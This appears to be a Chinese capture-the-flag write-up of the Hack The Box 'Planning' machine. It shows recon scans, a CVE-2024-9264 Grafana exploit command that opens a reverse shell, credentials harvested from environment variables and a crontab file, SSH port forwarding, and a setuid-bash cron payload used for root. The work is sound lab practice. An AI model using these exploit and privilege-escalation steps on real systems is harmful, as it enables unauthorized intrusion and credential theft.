---
title: HTB Planning
published: 2025-05-25
pinned: false
description: HTB Planning，渗透，wp
tags: ['HTB']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-05-25
pubDate: 2025-05-25
---


## 前言
好久没打靶机了，昨天睿抗校赛摸鱼打了一半，回宿舍打完了

## 外网打点

```
❯ nmap -sC -sV 10.10.11.68 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 14:57 CST
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 99.99% done; ETC: 14:58 (0:00:00 remaining)
Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 99.99% done; ETC: 14:58 (0:00:00 remaining)
Nmap scan report for 10.10.11.68
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.18 seconds
```
把域名加到`/etc/hosts`里面，访问一下，发现没有明显的目标，扫目录

```
❯ python dirsearch.py -u http://planning.htb

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12290

Target: http://planning.htb/

[15:03:45] Scanning:
[15:04:03] 200 -   12KB - /about.php
[15:04:30] 200 -   10KB - /contact.php
[15:04:31] 301 -   178B - /css  ->  http://planning.htb/css/
[15:04:43] 301 -   178B - /img  ->  http://planning.htb/img/
[15:04:44] 200 -   23KB - /index.php
[15:04:48] 403 -   564B - /js/
[15:04:48] 301 -   178B - /js  ->  http://planning.htb/js/
[15:04:49] 301 -   178B - /lib  ->  http://planning.htb/lib/
[15:04:49] 403 -   564B - /lib/

Task Completed
```
依旧没有有用的信息，后面上了个字典也没扫出来东西，爆一下子域名试试

```
❯ ./ffuf -w /home/zsm/fuzzDicts-Pro/subdomainDicts/main.txt  -u 'http://10.10.11.68' -H "Host:FUZZ.planning.htb" -fs 178  
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.68
 :: Wordlist         : FUZZ: /home/zsm/fuzzDicts-Pro/subdomainDicts/main.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 268ms]
```
扫出来一个，加到本地，访问，是个`grafana`的login页面，htb给了账号密码admin / 0D5oT70Fq13EvB5r，进去，同时看见版本是v11，网上找一下有没有cve，[CVE-2024-9264](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)，dump下来直接打

```
sudo python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 你的ip  --reverse-port 你的port

[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on port
``` 
这里本地是mac，一定要加上sudo才可以跑，成功拿到shell

```
Connection from 10.10.11.68:33462
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
LICENSE
bin
conf
public
# env
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
AWS_AUTH_EXTERNAL_ID=
SHLVL=1
HOME=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
_=ls
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/usr/share/grafana
```
docker逃逸？哦，有ssh，密码账号(enzo/RioTecRANDEntANT!)直接登录，拿到flag
```
enzo@planning:~$ ls
user.txt
```

## 提权
先传linpeas上去，没什么明显的漏洞，翻一下经常有问题的目录，成功找到
```
enzo@planning:/opt/crontabs$ cat crontab.db
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```
有个密码，尝试拿这个登录root，发现不行，继续信息收集

```
enzo@planning:/opt/crontabs$ netstat -tunlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33153         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```
8000转发到本地
```
ssh -L 8000:127.0.0.1:8000 enzo@planning.htb
```
上去看看，是个登录页面，拿root/P4ssw0rdS0pRi0T3c进入，是个web控制器，可以增加定时任务，写个经典payload进去
>cp /bin/bash /tmp/bash && chmod u+s /tmp/bash

在web页面启动一下这一条，然后
```
enzo@planning:/tmp$ ll
total 1464
drwxrwxrwt 12 root root    4096 May 24 07:54 ./
drwxr-xr-x 22 root root    4096 Apr  3 14:40 ../
-rwsr-xr-x  1 root root 1446024 May 24 07:54 bash*
-rw-r--r--  1 root root       0 May 24 07:54 Eceg9Qo0F31AOXNc.stderr
-rw-r--r--  1 root root       0 May 24 07:54 Eceg9Qo0F31AOXNc.stdout
drwxrwxrwt  2 root root    4096 May 24 07:50 .font-unix/
drwxrwxrwt  2 root root    4096 May 24 07:50 .ICE-unix/
drwx------  3 root root    4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-ModemManager.service-ukafnm/
drwx------  3 root root    4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-polkit.service-dvnH4d/
drwx------  3 root root    4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-systemd-logind.service-7AOUm6/
drwx------  3 root root    4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-systemd-resolved.service-sb4bu2/
drwx------  3 root root    4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-systemd-timesyncd.service-c2KwUc/
drwx------  2 root root    4096 May 24 07:51 vmware-root_736-2991268455/
drwxrwxrwt  2 root root    4096 May 24 07:50 .X11-unix/
drwxrwxrwt  2 root root    4096 May 24 07:50 .XIM-unix/
-rw-r--r--  1 root root       0 May 24 07:54 YvZsUUfEXayH6lLj.stderr
-rw-r--r--  1 root root       0 May 24 07:54 YvZsUUfEXayH6lLj.stdout
enzo@planning:/tmp$ ./bash -p
bash-5.2# id
uid=1000(enzo) gid=1000(enzo) euid=0(root) groups=1000(enzo)
bash-5.2# cd /root
bash-5.2# ls
root.txt  scripts
```
game over~

## 总结
被一些小点卡的莫名其妙的，还是太菜了。  
这个靶机就是典型的信息收集的，只要收集完了就百分百能出，没有过多的技巧和代码审计